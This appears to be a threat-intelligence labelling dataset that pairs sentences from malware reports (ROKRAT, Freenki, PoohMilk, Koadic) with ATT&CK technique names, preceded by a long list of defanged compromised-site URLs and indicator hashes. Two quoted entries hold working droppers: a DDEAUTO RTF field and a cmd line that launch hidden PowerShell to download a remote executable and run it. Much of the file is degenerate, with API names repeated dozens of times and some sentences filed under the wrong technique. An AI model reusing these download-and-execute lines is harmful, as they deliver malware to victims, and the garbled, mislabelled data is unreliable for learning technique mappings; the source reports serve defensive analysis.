hxxp://analyticalfootball[.]com//db_template.php hxxp://apiiination[.]com/leadership/db_template.php hxxps://ahelicoptermom[.]com/wp-includes/db_template.php hxxp://servicebox[.]co.za//db_template.php hxxp://globalelectricalandconstruction[.]co.za/wpscripts/db_template.php hxxps://aquo[.]in//db_template.php hxxps://www.alfransia[.]com/wp-admin/db_template.php hxxp://www.icsswaziland[.]com//db_template.php hxxp://aiko.pro//db_template.php hxxps://alceharfield[.]com//db_template.php hxxp://indocraft[.]co.za/test/db_template.php hxxp://allegiancesecurity[.]org//db_template.php hxxp://sullivanprimary[.]co.za//db_template.php hxxp://www.apmequestrian[.]com//db_template.php hxxps://alphawaves[.]org/wp-admin/db_template.php hxxp://www.alexandrasternin[.]com/illustration/db_template.php hxxp://www.daleth[.]co.za//db_template.php hxxp://jwseshowe[.]co.za/assets/db_template.php hxxp://winagainstebola[.]com//db_template.php hxxp://anubandh[.]in//db_template.php hxxp://www.alexanderhomestead[.]com//db_template.php hxxp://alfatek-intelligence[.]com//db_template.php hxxp://www.aprendiendoencasa[.]com/wp-includes/db_template.php hxxp://alorabrownies[.]com/wp-admin/db_template.php hxxp://andrasadam[.]com/tothildiko/wp-includes/db_template.php hxxp://cazochem[.]co.za/cazochem/db_template.php hxxp://debnoch[.]com/image/db_template.php hxxp://hmholdings360[.]co.za//db_template.php hxxp://iinvest4u[.]co.za//db_template.php hxxp://burgercoetzeeattorneys[.]co.za//db_template.php hxxp://anngrigphoto[.]com//db_template.php hxxp://alchemistasonida[.]com//db_template.php hxxp://anahera[.]biz/admin/db_template.php hxxp://h-u-i[.]co.za/heiren/db_template.php hxxp://insta-art[.]co.za//db_template.php hxxp://muallematsela[.]com//db_template.php hxxp://aguasdecastilla[.]com/uploads/db_template.php hxxp://www.arabgamenetwork[.]com//db_template.php hxxps://arhiepiscopiabucurestilor[.]ro/templates/db_template.php hxxp://amruthavana[.]com/blog/db_template.php hxxp://digitalblue[.]co.za//db_template.php hxxps://www.alvarezarquitectos[.]com//db_template.php hxxp://buboobioinnovations[.]co.za/wpimages/db_template.php hxxp://andrewsbisom[.]com//db_template.php hxxp://www.m-3[.]co.za//db_template.php hxxp://beesrenovations[.]co.za/images/db_template.php hxxps://www.apliety[.]co.il/wp-includes/db_template.php hxxp://alchamelup[.]org/htdocs/db_template.php hxxp://benonicoc[.]co.za/resources/db_template.php hxxps://al-mostakbl[.]com//db_template.php hxxp://alchimiegrafiche[.]net/bbdelteatro/db_template.php hxxp://andrespazsoldan[.]com//db_template.php hxxp://in2accounting[.]co.za//db_template.php hxxp://aipa[.]ca//db_template.php hxxp://alphabee.fund/PHPMailer_5.2.0/db_template.php hxxp://arabsdeals[.]com//db_template.php hxxps://archiotronic[.]com/wp-includes/db_template.php hxxp://capewindstrading[.]co.za//db_template.php hxxps://althurayaa[.]com//db_template.php hxxp://jhphotoedits[.]co.za//db_template.php hxxp://cloudhub.co.ls/modules/db_template.php hxxp://apironco[.]com/wp-includes/db_template.php hxxp://digital-cameras-south-africa[.]co.za/script/db_template.php hxxp://ahmadhasanat[.]com//db_template.php hxxp://alexrocchi[.]com//db_template.php hxxp://aljaadi[.]com//db_template.php hxxps://www.engeltjieakademie[.]co.za//db_template.php hxxp://annabelle[.]nl/next/db_template.php hxxp://juniorad[.]co.za/vendor/db_template.php hxxp://animationpulse[.]net//db_template.php hxxp://angloglot[.]com//db_template.php hxxp://agricolavicuna.cl//db_template.php hxxp://alexelgy[.]com/allaccess/db_template.php hxxp://www.centreforgovernance[.]uk//db_template.php hxxp://www.aliandconsulting[.]com//db_template.php hxxp://balaateen[.]co.za/less/db_template.php hxxp://aleksicdunja[.]com//db_template.php hxxp://arestihome[.]com//db_template.php hxxp://am1int.fcomet[.]com/wp1/db_template.php hxxp://anet-international-group[.]com/shop/db_template.php hxxp://courtesydriving[.]co.za/js/db_template.php hxxp://annaplebanek[.]com//db_template.php hxxp://agencijazemil[.]com//db_template.php hxxp://airminumtiro[.]com//db_template.php hxxp://www.androidwikihow[.]com//db_template.php hxxp://alisabyfinna[.]com//db_template.php hxxp://rma-law[.]co.za//db_template.php hxxp://amari[.]ro/components/db_template.php hxxp://anxiousandunstoppable[.]com//db_template.php hxxp://www.buhlebayoacademy[.]com//db_template.php hxxp://arabellajo[.]com/wp/wp-includes/db_template.php hxxp://blackthorn[.]co.za//db_template.php hxxp://alaqaba[.]com/dnsarabia[.]com/db_template.php hxxp://airesis.blog/wp-admin/db_template.php hxxp://www.aptibet[.]org//db_template.php hxxp://alecattic[.]com/wp-includes/db_template.php hxxp://anglero[.]com//db_template.php hxxp://getabletravel[.]co.za/wpscripts/db_template.php hxxp://www.allwestdental[.]com/wp-includes/db_template.php hxxp://printernet[.]co.za//db_template.php hxxp://genesisbs[.]co.za//db_template.php hxxp://allsporthealthandfitness[.]com//db_template.php hxxp://www.humorcarbons[.]com//db_template.php hxxp://intelligentprotection[.]co.za//db_template.php hxxp://amazethings[.]com//db_template.php hxxp://incoso[.]co.za/images/db_template.php hxxp://www.antoanetapalikarska[.]com//db_template.php hxxps://www.alteaparadise[.]com/wp-includes/db_template.php hxxp://amirmenahem[.]com//db_template.php hxxp://isound[.]co.za//db_template.php hxxp://www.alestilorachel[.]com//db_template.php hxxp://alcfm[.]net/wp-admin/db_template.php hxxp://www.acer-parts[.]co.za//db_template.php hxxp://www.gsmmid[.]com//db_template.php hxxp://skhaleni[.]co.za//db_template.php hxxps://amiici.vision//db_template.php hxxps://andihaas[.]at/wp-includes/db_template.php hxxp://www.albertaprimebeef[.]com//db_template.php hxxps://www.appster[.]it/wp-includes/db_template.php hxxp://amofoundation[.]org/wp-includes/db_template.php hxxp://iqra[.]co.za/pub/db_template.php hxxp://thecompasssolutions[.]co.za//db_template.php hxxp://archwaycarpetscrm[.]co[.]uk//db_template.php hxxp://iggleconsulting[.]com//db_template.php hxxps://angel-blanco[.]net/wp-includes/db_template.php hxxps://anotherdayinparadise[.]ca//db_template.php hxxp://www.bitp[.]co.za//db_template.php hxxp://cupboardcure[.]co.za/vendor/db_template.php hxxp://all2wedding[.]com/wp-includes/db_template.php hxxp://allianz[.]com.pe/wp-admin/db_template.php hxxp://amiehepperlin[.]com//db_template.php hxxps://www.amighini[.]it/webservice/db_template.php hxxp://broken-arrow[.]co.za//db_template.php hxxp://www.ihlosiqs-pm[.]co.za//db_template.php hxxp://alisimple[.]si/wp-includes/db_template.php hxxp://allthat[.]social//db_template.php hxxp://www.amphibiblechurch[.]com//db_template.php hxxp://bestencouragementwords[.]com//db_template.php hxxp://alayhamtechnologies[.]com//db_template.php hxxps://alaskanharvestseafood[.]com/backup/db_template.php hxxps://www.air-mag[.]ro//db_template.php hxxp://get-paid-for-online-survey[.]com//db_template.php hxxp://www.antc[.]ch/wp-includes/db_template.php hxxp://firstchoiceproperties[.]co.za//db_template.php hxxp://habibtextiles[.]pk//db_template.php hxxp://fsproperties[.]co.za/engine1/db_template.php hxxp://diegemmerkat[.]co.za//db_template.php hxxp://molepetravel.co.ls//db_template.php hxxp://mmetl[.]co.za//db_template.php hxxp://altrablog[.]com//db_template.php hxxp://abrahamseed[.]co.za//db_template.php hxxp://www.amerindgen[.]com/author/admin1/db_template.php hxxp://altcoinaddict[.]com//db_template.php hxxp://iiee.edu[.]pk//db_template.php hxxp://cmhts[.]co.za/resources/db_template.php hxxp://domesticguardians[.]co.za/Banner/db_template.php hxxps://amishcountryfurnishings[.]com//db_template.php hxxps://allday[.]gr//db_template.php hxxp://www.alinn-u-yin[.]com//db_template.php hxxps://www.allin-chain[.]com//db_template.php hxxps://www.anatapackaging[.]com/vendors/db_template.php hxxp://alexcelts[.]com/wp/db_template.php hxxp://www.allstylus[.]com.br//db_template.php hxxp://www.algom-law[.]com//db_template.php hxxp://ambiances-toiles[.]fr//db_template.php Appendix Security Tools Checked on the Machine win32_remote win64_remote64 ollydbg ProcessHacker tcpview autoruns autorunsc filemon procmon regmon procexp idaq idaq64 ImmunityDebugger Wireshark dumpcap HookExplorer ImportREC PETools LordPE dumpcap SysInspector proc_analyzer sysAnalyzer sniff_hit windbg joeboxcontrol joeboxserver"
        ]
    },
    "virtualization/sandbox evasion remote file copy-multi": {
        "technique_names": [
            "remote file copy",
            "virtualization/sandbox evasion"
        ],
        "sentances": [
            "The first email displays the following decoy document to the infected user and download the following payload:hxxp://discgolfglow[.]com:/wp-content/plugins/maintenance/images/worker.jpgThe second email displays the following decoy document to the infected user and downloads the following payload:hxxp://acddesigns[.]com[.]au/clients/ACPRCM/kingstone.jpgIn both cases, the downloaded payload is the ROKRAT malware.The first tasks of this variant of ROKRAT is to check the operating system version"
        ]
    },
    "execution through api": [
        "The script is used to decode and execute the following payloads:Appach01.jpg (renamed: Windows-KB275122-x86.exe) is a Freenki sample.Appach01.jpg (renamed: Windows-KB271854-x86.exe) is a PoohMilk sample.PoohMilk AnalysisThe PoohMilk sample is designed to perform two actions:Create persistence to execute the Freenki sample at the next reboot.Check specific files on the infected machine.The first action is to create a registry key in order to execute the Windows-KB275122-x86.exe file previously downloaded",
        "In this context the main function is executed.\"Console\": with the argument, a persistence is configured and the malware will be executed at the next reboot ( HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\runsample ).\"Sample\": with this argument, the malware executes the console command followed by the help command.The information collected is performed using WMI queries:Additionally the malware lists the running process via the Microsoft Windows API",
        "The overwritten instruction (displayed in Figure 1) is used to call the \u201cWinExec\u201d function from kernel32.dll, as depicted in the instruction at 00430c12, which calls the \u201cWinExec\u201d function",
        "The payload then calls the VirtualAllocEx API to create a buffer in the newly hollowed process and the WriteProcessMemory API to write the supplied data buffer that contains the code to inject to this newly created buffer",
        "FInally , the newest sample uses dynamic API lookups to attempt to make static disassembly harder to understand.",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        "Windows API calls ",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        " Win32 API",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        "CreateProcess ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadLibrary ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " LoadModule() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " \nLoadPackagedLibrary() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " WinExec() ",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute",
        " ShellExecute"
    ],
    "modify registry registry run keys / startup folder query registry-multi": {
        "technique_names": [
            "modify registry",
            "registry run keys / startup folder",
            "query registry"
        ],
        "sentances": [
            "Here is the registry creation:The registry location where persistence is achieved is: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Windows Update",
            "Deletion of all registry keys associated with the extraction of the SFX RAR Deletion of the User Assist Key entries related to applications that have been recently executed Deletion of all registry keys relating to services that have recently run  Clearly the attacker using this PlugX is paranoid about it being detected on disk, both in the registry and the file system"
        ]
    },
    "system information discovery remote file copy-multi": {
        "technique_names": [
            "system information discovery",
            "remote file copy"
        ],
        "sentances": [
            "The file will be inflated in order to retrieve a RTF document, this document will be displayed to the infected user by executing Wordpad.Here is the PDB path from the PoohMilk sample:E:\\BIG_POOH\\Project\\milk\\Release\\milk.pdbFreenki SampleThe purpose of Freenki is to collect information on the infected system and to download a third executable"
        ]
    },
    "account discovery obfuscated files or information-multi": {
        "technique_names": [
            "account discovery",
            "obfuscated files or information"
        ],
        "sentances": [
            "The malware uses obfuscation in order to hide strings such as URL or User-Agent, the algorithm is based on bitwise (SUB 0x0F XOR 0x21), here is the decoded data:hxxp://old[.]jrchina[.]com/btob_asiana/udel_confirm.phpMozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; Tablet PC 2.0; .NET4.0E; InfoPath.3)The downloaded third payload is obfuscated using the same technique"
        ]
    },
    "process hollowing": [
        "Additionally we see a cmd.exe process launched and used for process injection using the VirtualAlloc(), WriteProcessMemory() and CreateRemoteThread() Windows APIs, as with the first finding of ROKRAT they continue to use similar Windows APIs",
        "Unpacks the code in memory via process hollowing",
        "It hands over the decrypted buffer extracted from the resource section and the path from the original RegAsm executable to the start_protect_hexcode function.Then it starts the process-hollowing shellcode, which is stored in the HEXCODE1 variable",
        "Then, they are using the process hollowing technique to hide the execution of these tools inside of the original Microsoft vbc.exe (VisualBasic Compiler) process",
        "Figure 6 Example of delivery document The RTF document (8cf3bc2bf\u2026) was very small in size at 264 bytes, which can be seen in its entirety here:       {\\rtf1{\\field{\\*\\fldinst DDEAUTO \"C:\\\\\\\\WIndowS\\\\\\\\SYsTem32\\\\\\\\cMD.eXe \" \"/C\tPOWErsHELl.eXE\u00a0\u00a0-ex\u00a0\u00a0\u00a0\u00a0 BypaSs\u00a0\u00a0-NOP\t-w\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0HIdDen\u00a0\u00a0(NEw-oBjeCT SyStEm.NET.weBCLiENT).dowNloADFILe( 'hxxp://86.106.131[.]177/link/GRAPH.EXE'\u00a0\u00a0,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 '%apPDAtA%\\graph.exe'\u00a0\u00a0 )\u00a0\u00a0 ;\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 saps\u00a0\u00a0\u00a0\u00a0'%Appdata%\\graph.exe'\"}}}     The contents above use the DDE functionality in Microsoft Word to run a PowerShell script to download the Koadic payload from a remote server, save it as an executable file on the system and then execute the payload",
        "Figure 1 Article referenced by decoy document in attack against British government agency \u00a0 The attached document leverages a DDE exploit to ultimately execute the following code:c:\\\\windows\\\\system32\\\\cmd.exe \"/k PowerShell.exe -ExecutionPolicy bypass -windowstyle hidden -noprofile -command (New-Object System.Net.WebClient).DownloadFile('https://881.000webhostapp[.]com/0_31.doc', '%TEMP%\\\\AAA.exe');Start-Process('%TEMP%\\\\AAA.exe')Palo Alto Networks first witnessed this DDE exploit technique in May 2017, and attackers continue to leverage it",
        "Upon execution, this Trojan checks to see if it was configured with \u201cBINDERON\u201d to determine if it should extract an embedded payload from a resource named \u201cB\u201d, save it to %TEMP%\\%BIND1%, and create a new process with the embedded payload"
    ],
    "process injection command-line interface-multi": {
        "technique_names": [
            "process injection",
            "command-line interface"
        ],
        "sentances": [
            "The following graph view from IDA shows these steps.These execution steps allow the launch of the new ROKRAT variant by decoding the PE binary and injecting into the cmd.exe process"
        ]
    },
    "dll search order hijacking dll side-loading-multi": {
        "technique_names": [
            "dll search order hijacking",
            "dll side-loading"
        ],
        "sentances": [
            "This is performed by checking if the following libraries are loaded on the victim machine.SbieDll.dll (sandboxie library)Dbghelp.dll (Microsoft debugging tools)Api_log.dll (threatAnalyzer / GFI SandBox)Dir_watch.dll (threatAnalyzer / GFI SandBox)We were able to uncover some other techniques used by this variant of ROKRAT to make analysis difficult, Group 123 used an anti-debugging technique related to NOP (No Operation).nop dword ptr [eax+eax+00h] is a 5 byte NOP"
        ]
    },
    "fallback channels system time discovery-multi": {
        "technique_names": [
            "fallback channels",
            "system time discovery"
        ],
        "sentances": [
            "The source code only considers the following machine types:default:   lpString = \"(Other)\";               break;case 0x02: lpString = \"(Unknown)\";             break;case 0x03: lpString = \"(Desktop)\";             break;case 0x04: lpString = \"(Low Profile Desktop)\"; break;case 0x06: lpString = \"(Mini Tower)\";          break;case 0x07: lpString = \"(Tower)\";               break;case 0x08: lpString = \"(Portable)\";            break;case 0x09: lpString = \"(Laptop)\";              break;case 0x0A: lpString = \"(Notebook)\";            break;case 0x0E: lpString = \"(Sub Notebook)\";        break;The string format - with the () - and the considering types are exactly the same as those used in the ROKRAT samples.It's interesting to note that this reconnaissance phase was not included in the ROKRAT variant used during the \"Golden Time\" campaign.Brower StealerFor the first time, the ROKRAT sample used during the \"North Korean Human Rights\" contained a browser credentials stealer"
        ]
    },
    "spearphishing link clipboard data binary padding data encrypted-multi": {
        "technique_names": [
            "spearphishing link",
            "clipboard data",
            "binary padding",
            "data encrypted",
            "arp"
        ],
        "sentances": [
            "We also believe their target profile may change but for now it will mostly focus on Korean peninsula targets, however, as explained their capabilities will likely continue to evolve over time as they further refine their TTPs.IOCs\"Golden Time\" Campaign:Maldoc #1 sha256: 7d163e36f47ec56c9fe08d758a0770f1778fa30af68f39aac80441a3f037761eMaldoc #2 sha256: 5441f45df22af63498c63a49aae82065086964f9067cfa75987951831017bd4fROKRAT #1: cd166565ce09ef410c5bba40bad0b49441af6cfb48772e7e4a9de3d646b4851cROKRAT #1: 051463a14767c6477b6dacd639f30a8a5b9e126ff31532b58fc29c8364604d00Network:Malicious URLs:- hxxp://discgolfglow[.]com/wp-content/plugins/maintenance/images/worker.jpg- hxxp://acddesigns[.]com[.]au/clients/ACPRCM/kingstone.jpgSafe URLs:- hxxps://www[.]amazon[.]com/Men-War-PC/dp/B001QZGVEC/EsoftTeam/watchcom.jpg- hxxp://www[.]hulu[.]com/watch/559035/episode3.mp4\"Evil New Year\" Campaign:Maldoc sha256: 281828d6f5bd377f91c6283c34896d0483b08ac2167d34e981fbea871893c919Dropped #1: 95192de1f3239d5c0a7075627cf9845c91fd397796383185f61dde893989c08aDropped #2: 7ebc9a1fd93525fc42277efbccecf5a0470a0affbc4cf6c3934933c4c1959eb1Dropped #3: 6c372f29615ce8ae2cdf257e9f2617870c74b321651e9219ea16847467f51c9fDropped #4: 19e4c45c0cd992564532b89a4dc1f35c769133167dc20e40b2a41fccb881277bDropped #5: 3a0fc4cc145eafe20129e9c53aac424e429597a58682605128b3656c3ab0a409Dropped #6: 7d8008028488edd26e665a3d4f70576cc02c237fffe5b8493842def528d6a1d8Unpacked #1: 7e810cb159fab5baccee7e72708d97433d92ef6d3ef7d8b6926c2df481ccac2fUnpacked #1: 21b098d721ea88bf237c08cdb5c619aa435046d9143bd4a2c4ec463dcf275cbeUnpacked #1: 761454dafba7e191587735c0dc5c6c8ab5b1fb87a0fa44bd046e8495a27850c7Unpacked #1: 3d442c4457cf921b7a335c0d7276bea9472976dc31af94ea0e604e466596b4e8Unpacked #1: 930fce7272ede29833abbfb5df4e32eee9f15443542434d7a8363f7a7b2d1f00Unpacked #1: 4b20883386665bd205ac50f34f7b6293747fd720d602e2bb3c270837a21291b4Unpacked #1: f080f019073654acbe6b7ab735d3fd21f8942352895890d7e8b27fa488887d08Network:- www[.]imuz[.]com/admin/data/bbs/review2/board/index.php- www[.]imuz[.]com/admin/data/bbs/review2/board/123.php- www[.]imuz[.]com/admin/data/bbs/review2/board/02BC6B26_put.jpg (where 02BC6B26 is randomly generated)- www[.]wildrush[.]co[.]kr/bbs/data/image/work/webproxy.php- www[.]wildrush[.]co[.]kr/bbs/data/image/work/02BC6B26_put.jpg (where 02BC6B26 is randomly generated)- www[.]belasting-telefoon[.]nl//images/banners/temp/index.php- www[.]belasting-telefoon[.]nl//images/banners/temp/02BC6B26_put.jpg (where 02BC6B26 is randomly generated)- www[.]kgls[.]or[.]kr/news2/news_dir/index.php- www[.]kgls[.]or[.]kr/news2/news_dir/02BC6B26_put.jpg (where 02BC6B26 is randomly generated)\"Are You Happy?\" Campaign:Wiper sha256: 6332c97c76d2da7101ad05f501dc1188ac22ce29e91dab6d0c034c4a90b615bd\"FreeMilk\" Campaign:Office sha256: f1419cde4dd4e1785d6ec6d33afb413e938f6aece2e8d55cf6328a9d2ac3c2d0HTA sha256: a585849d02c94e93022c5257b162f74c0cdf6144ad82dd7cf7ac700cbfedd84fJS sha256: 1893af524edea4541c317df288adbf17ae4fcc3a30d403331eae541281c71a3cPoohMilk sha256: 35273d6c25665a19ac14d469e1436223202be655ee19b5b247cb1afef626c9f2Freenki sha256: 7f35521cdbaa4e86143656ff9c52cef8d1e5e5f8245860c205364138f82c54dfFreenki 2016: 99c1b4887d96cb94f32b280c1039b3a7e39ad996859ffa6dd011cf3cca4f1ba5Network:- hxxp://old[.]jrchina[.]com/btob_asiana/udel_calcel.php?fdid=[base64_data]- hxxp://old[.]jrchina[.]com/btob_asiana/appach01.jpg- hxxp://old[.]jrchina[.]com/btob_asiana/appach02.jpg- hxxp://old[.]jrchina[.]com/btob_asiana/udel_ok.ipp- hxxp://old[.]jrchina[.]com/btob_asiana/udel_confirm.php\"North Korean Human Rights\" Campaign:Maldoc sha256: 171e26822421f7ed2e34cc092eaeba8a504b5d576c7fd54aa6975c2e2db0f824Dropper #1: a29b07a6fe5d7ce3147dd7ef1d7d18df16e347f37282c43139d53cce25ae7037Dropper #2: eb6d25e08b2b32a736b57f8df22db6d03dc82f16da554f4e8bb67120eacb1d14Dropper #3: 9b383ebc1c592d5556fec9d513223d4f99a5061591671db560faf742dd68493fROKRAT:: b3de3f9309b2f320738772353eb724a0782a1fc2c912483c036c303389307e2e\"Evil New Year 2018\" Campaign:Maldoc sha256: f068196d2c492b49e4aae4312c140e9a6c8c61a33f61ea35d74f4a26ef263eadPNG : bdd48dbed10f74f234ed38908756b5c3ae3c79d014ecf991e31b36d957d9c950ROKRAT:: 3f7827bf26150ec26c61d8dbf43cdb8824e320298e7b362d79d7225ab3d655b1Network:- 